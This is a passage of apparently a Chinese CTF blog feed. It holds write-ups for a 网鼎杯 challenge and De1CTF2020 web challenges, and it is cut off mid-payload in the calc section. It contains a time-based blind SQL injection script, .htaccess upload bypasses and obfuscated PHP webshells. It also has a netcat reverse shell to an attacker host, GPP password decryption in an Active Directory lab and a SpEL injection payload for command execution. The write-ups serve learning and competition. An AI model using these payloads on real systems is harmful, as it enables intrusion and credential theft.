class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    a=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">"0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;-"</span>:</span><br><span class="line">        url = <span class="string">'http://1ff59e94406f4210a83ac8268a0037c3334b9006071c441b.changame.ichunqiu.com/register_do.php'</span></span><br><span class="line">        payload = <span class="string">"1'^if(ascii(substr((select `2` from (select 1,2 union select * from flag)a limit 1,1),"</span>+str(i)+<span class="string">",1))="</span> + str(ord(j)) + <span class="string">",pow(99999,100) or sleep(3),pow(99999,100)),'1')#"</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span>: payload,</span><br><span class="line">            <span class="string">'password'</span>: <span class="string">'321'</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data, timeout=<span class="number">3.0</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">            flag+=j</span><br><span class="line">            print(flag)</span><br><span class="line">            a=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> a==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="/2020/05/10/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-WEB-writeup/5.png" alt><br>老实说最后十几分钟可能不够做出来的吧。但如果更早点敏锐的察觉到这种注入并找到手段就好了…但是这题收获还是不少的。毕竟自己好久没见到insert_into的盲注。手法也生疏了不少。sql注入的技巧学习还要继续加把劲啊。</p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>网鼎结束后这个月还有不少其他比赛。不过估计没多少时间花在CTF上了。这个月一方面希望把java,渗透等方面的知识再接触下。然后比赛打好。等下个月差不多就要专注在学业上了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>De1CTF2020</title>
      <link href="2020/05/04/De1CTF2020writeup/"/>
      <url>2020/05/04/De1CTF2020writeup/</url>
      
        <content type="html"><![CDATA[<p>终于到第二次XCTF了。没想到De1ta的题这次这么顶，果然是出给国际队伍的难度。(膜一波国内外大佬队伍)<br>小绿草这次也就我们大二的几个在打，大家基本都自闭了。WEB自己也只做出两道题，说实话要是自己JAVA的学习计划再提前一点的话说不定能把calc那题出了的…<br>这样也不至于被卡在20名开外。</p><p>等wp出来自己争取把能做的题都复现了。</p><a id="more"></a><h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p>这题还算比较简单.就是自己一开始手贱选的mixture去做浪费了不少时间</p><p>首先简单上传FUZZ下，会发现限制了filename，filetype以及file的内容<br>其他的都还好。不过内容黑名单里<br><code>perl|pyth|ph|auto|curl|base|&gt;|rm|ruby|openssl|war|lua|msf|xter|telnet in contents</code><br>主要是一个ph的问题。对webshell而言,应该只能使用不闭合的短标签了</p><p>但是因为文件后缀严格限制，所以只能按照要求上传图片马。现在需要.htaccess来控制解析它。<br>幸运的是，.htaccess并没有被限制<br>不过注意。.htaccess中常见的几种把.jpg解析成php的写法中，php是必不可少的.那就得绕过限制上传</p><p>这里就有两种思路了，一种是上传cgi进行getshell,当时简单搜了下发现确实并不需要php出现</p><p>但是更简单的是来自XNUCA的非预期解。使用\直接绕过waf。<br>即使是.htaccess这种说法上不允许换行的文件，它也是支持<code>\</code>直接换行的，因此轻松bypass</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">addtype application&#x2F;x-httpd-p\</span><br><span class="line">hp .jpg</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=system(<span class="string">'cat /flag'</span>);</span><br></pre></td></tr></table></figure><p><img src="/2020/05/04/De1CTF2020writeup/1.PNG" alt></p><h2 id="Hard-Pentest-1"><a href="#Hard-Pentest-1" class="headerlink" title="Hard_Pentest_1"></a>Hard_Pentest_1</h2><p>做完这题真的是得庆幸自己当初htb做了台windows的靶机。不然连做下去的勇气都没有</p><p>比赛时没咋截图,将就下看吧<br>首先第一步是给出的上传源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//Clear the uploads directory every hour</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$sandbox = <span class="string">"uploads/"</span>. md5(<span class="string">"De1CTF2020"</span>.$_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">"submit"</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span> (($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] &lt; <span class="number">2048</span>) &amp;&amp; Check())&#123;</span><br><span class="line">        <span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $filename=md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]).<span class="string">"_"</span>.$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">            move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], $filename);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"save in:"</span> . $sandbox.<span class="string">"/"</span> . $filename;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Not Allow!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $BlackExts = <span class="keyword">array</span>(<span class="string">"php"</span>);</span><br><span class="line">    $ext = explode(<span class="string">"."</span>, $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line">    $exts = trim(end($ext));</span><br><span class="line">    $file_content = file_get_contents($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">'/[a-z0-9;~^`&amp;|]/is'</span>,$file_content)  &amp;&amp; </span><br><span class="line">        !in_array($exts, $BlackExts) &amp;&amp; </span><br><span class="line">        !preg_match(<span class="string">'/\.\./'</span>,$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>])) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>webshell的限制,主要是文件后缀跟内容。<br>自己一开始的想法是正则回溯绕下<code>!preg_match()</code>但是很快就发现文件太大传不上去。<br>而且webshell连分号都没了,不好构造。<br>经队友提醒是台windows靶机,可以利用windwos不区分大小写的特性上传。<br>同时内容可以参考XCTFFINALlfi,用全短标签构造无字母数字webshell<br>大概是下面这样的吧,当时自己写的用不出来，借了郁师傅的直接上车。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=$_=[]<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$_=@<span class="string">"$_"</span><span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$_=$_[<span class="string">'!'</span>==<span class="string">'@'</span>]<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$___=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$___.=$__<span class="meta">?&gt;</span><span class="meta">&lt;?</span>= $___.=$__<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$___.=$__<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$___.=$__<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$___.=$__<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$____=<span class="string">'_'</span><span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$____.=$__<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$____.=$__<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$____.=$__<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$____.=$__<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$_=$$____<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$_[__]($_[_])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>当时还顺手nmap扫了下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-02 13:27 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 47.113.219.76</span><br><span class="line">Host is up (0.016s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT     STATE  SERVICE       VERSION</span><br><span class="line">22/tcp   closed ssh</span><br><span class="line">80/tcp   open   http          Microsoft IIS httpd 8.5 (PHP 7.2.29)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Unknown</span><br><span class="line">|_http-title: upload</span><br><span class="line">3389/tcp closed ms-wbt-server</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 118.83 seconds</span><br></pre></td></tr></table></figure><p>然后想抱郁师傅大腿失败了…只能靠自己了。<br>因为题目同一个ip被出成两个题，基本很容易能看出来要么是单纯提权,要么是windows域渗透。</p><p>这里windows靶机八成就是为了域渗透准备的。</p><p>硬着头皮不管3721先弹个shell<br>当时根目录有别的师傅传的NC,那就不用我自己传了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\nc.exe vpsip port -e powershell</span><br></pre></td></tr></table></figure><p>这样不至于在uploads目录被删时丢掉所有shell.<br>然后传个winPEAS.exe 进行信息收集。<br>这个也是做htb时学到的脚本，一般是为了提权扫描下。基本上能满足需求。<br>信息里有一处比较明显<br><img src="/2020/05/04/De1CTF2020writeup/2.PNG" alt></p><p>脚本列出的信息中有一个域用户名字很敏感。HintZip_Pass<br>下面开始手动信息收集</p><p>参考这篇文章<a href="https://wh0ale.github.io/2018/12/19/2018-12-19-%E5%9F%9F%E6%B8%97%E9%80%8F/" target="_blank" rel="noopener">域渗透总结</a></p><blockquote><p>域（Domain）是相对工作组（Workgroup）的概念，形象的说，域就像中央集权，由一台或数台域控制器（Domain Controller）管理域内的其他计算机</p></blockquote><p>所以域渗透的核心是通过可控的域用户，收集其中的可用信息，进一步利用其他漏洞发展更多域用户。最后能拿到管理员的哈希，基本就算渗透完整了。</p><p>ipconfig /all可以确认处于域管理模式中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Public&gt; net user &#x2F;domain</span><br><span class="line">net user &#x2F;domain</span><br><span class="line">The request will be processed at a domain controller for domain De1CTF2020.lab.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">User accounts for \\dc.De1CTF2020.lab</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            De1CTF1                  de1ta                    </span><br><span class="line">Guest                    HintZip_Pass             krbtgt                   </span><br><span class="line">web                      </span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure><p>查询域用户时也能得到跟winPEAS一样的关于域用户的信息。<br>尝试net use</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; net use</span><br><span class="line">net use</span><br><span class="line">New connections will be remembered.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Status       Local     Remote                    Network</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">OK                     \\192.168.0.12\Hint       Microsoft Windows Network</span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure><p>发现<code>\\192.168.0.12\Hint</code>。且由于我们刚刚是建立的IPC空链接。因此可以无需用户名密码访问它。(不过我后来再看时发现这个地址没了)<br><code>net view\\192.168.0.12\</code>也能发现有Hint,SYSVOL,NETLOGIN几个目录</p><p>直接pushd<code>\\192.168.0.12\Hint</code>进入filesystem.发现了一个flag1_and_flag2hint.zip</p><p>基于我们玩的是多人渗透。所以最好把它copy到自己私密的位置。或者把它以其他文件格式保存下来。(因为我在思考如何把它拿下来时刚好在蚁剑的shell里发现别人的zip文件2333)<br>直接下好别人的zip后,现在要一个密码</p><p>这里就体现出信息收集的重要性了。因为我们之前发现可以用的文件夹除了Hint还有SYSVOL.所以我选择百度<code>域渗透 SYSVOL</code><br>得到这篇文章<a href="https://xz.aliyun.com/t/1653/" target="_blank" rel="noopener">域渗透——利用SYSVOL还原组策略中保存的密码</a><br>在域中，存在一个默认的共享路径<code>\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\</code></p><blockquote><p>域管理员在使用组策略批量管理域内主机时，如果配置组策略的过程中需要填入密码，那么该密码会被保存到共享文件夹\SYSVOL下，默认所有域内用户可访问，虽然密码通过AES 256进行加密，密钥是公开在微软官网的。</p></blockquote><p>参考这篇文章<a href="https://www.cnblogs.com/zpchcbd/p/11703687.html" target="_blank" rel="noopener">域渗透：GPP(Group Policy Preferences)漏洞</a><br>可以使用<code>dir /s /a \\域控IP\SYSVOL\*.xml</code>来尝试列出存在的xml<br><code>dir /s /a \\192.168.0.12\SYSVOL\*.xml</code><br>得到完整路径后读取。这里试了下type不行，gc不行。用more成了<br><code>more \\192.168.0.12\SYSVOL\De1CTF2020.lab\Policies\{B1248E1E-B97D-4C41-8EA4-1F2600F9264B}\Machine\Preferences\Groups\Groups.xml</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Groups</span> <span class="attr">clsid</span>=<span class="string">"&#123;3125E937-EB16-4b4c-9934-544FC6D24D26&#125;"</span>&gt;</span><span class="tag">&lt;<span class="name">User</span> <span class="attr">clsid</span>=<span class="string">"&#123;DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1&#125;"</span> <span class="attr">name</span>=<span class="string">"HintZip_Pass"</span> <span class="attr">image</span>=<span class="string">"2"</span> <span class="attr">changed</span>=<span class="string">"2020-04-15 14:43:23"</span> <span class="attr">uid</span>=<span class="string">"&#123;D33537C1-0BDB-44B7-8628-A6030A298430&#125;"</span>&gt;</span><span class="tag">&lt;<span class="name">Properties</span> <span class="attr">action</span>=<span class="string">"U"</span> <span class="attr">newName</span>=<span class="string">""</span> <span class="attr">fullName</span>=<span class="string">""</span> <span class="attr">description</span>=<span class="string">""</span> <span class="attr">cpassword</span>=<span class="string">"uYgjj9DCKSxqUp7gZfYzo0F6hOyiYh4VmYBXRAUp+08"</span> <span class="attr">changeLogon</span>=<span class="string">"1"</span> <span class="attr">noChange</span>=<span class="string">"0"</span> <span class="attr">neverExpires</span>=<span class="string">"0"</span> <span class="attr">acctDisabled</span>=<span class="string">"0"</span> <span class="attr">userName</span>=<span class="string">"HintZip_Pass"</span>/&gt;</span><span class="tag">&lt;/<span class="name">User</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Groups</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这个cpassword恰好是属于HintZip_Pass的。那么根据上文，由于私钥暴露。只要知道公钥cpassword即可破解。</p><p>kali有现成的gpp-decrypt 直接用<code>gpp-decrypt uYgjj9DCKSxqUp7gZfYzo0F6hOyiYh4VmYBXRAUp+08</code>就成。<br>得到密码后解出zip文件<br><img src="/2020/05/04/De1CTF2020writeup/3.PNG" alt></p><p>这题做完后后续提示看都不想看了.真的是难.不过收获特挺多的。<br>(以后我一定好好学渗透.jpg)</p><h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><p>昨天比赛时没做出来…第二天zjy师傅构造出了payload。才感慨自己还是太菜了。</p><p>抓包就能得到<code>spel/calc?calc=</code>的路由<br>提示的这么明显，只能是spEL的表达式注入了。<br>不过简单FUZZ一下，发现果不其然有waf。<br>大概有这些关键字吧，<br><code>#,getClass, T( ,java.lang, new ,String,</code><br>想要直接RCE当然不行。所以得构造</p><p>第一想法是查资料，找到不少师傅做code-breaking时用反射进行spEL-RCE的payload<br>原本是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec()</span><br></pre></td></tr></table></figure><p>通过反射，我们就能巧妙利用反射构造出类与方法。使用字符串拼接绕过。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String.class.getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("exec",String.class).invoke(String.class.getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(String.class.getClass().forName("java.l"+"ang.Ru"+"ntime")),"curl xxxx");</span><br></pre></td></tr></table></figure><p>但是这里String,getClass没了。不过也有方法绕过<br>使用<code>&#39;&#39;[&#39;class&#39;]</code>数组直接绕<br>这是参考SEAM2.3.1的一个反序化payload的改法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>[<span class="string">'class'</span>].forName(<span class="string">'java.lang.Runtime'</span>).getDeclaredMethods()[<span class="number">15</span>].invoke(<span class="string">''</span>[<span 